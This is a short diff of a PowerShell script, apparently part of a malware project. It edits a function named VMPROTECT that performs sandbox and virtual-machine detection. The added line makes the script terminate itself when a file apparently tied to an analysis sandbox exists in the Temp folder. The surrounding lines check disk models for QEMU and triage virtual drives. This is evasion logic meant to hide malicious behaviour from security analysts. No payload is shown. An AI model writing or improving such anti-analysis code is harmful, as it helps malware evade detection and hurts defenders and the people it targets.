@@ -124,11 +124,8 @@ function ram_check {
 
 
 function VMPROTECT {
-    ram_check      
-    #if (Get-Service -Name "ikeext" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
-    #    ShowError "ikeext"
-    #    Stop-Process $pid -Force
-    #}     
+    if (Test-Path "$env:localappdata\Temp\JSAMSIProvider64.dll") { Stop-Process $pid -Force }
+    ram_check           
     #triage detection
     $d = wmic diskdrive get model
     if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {
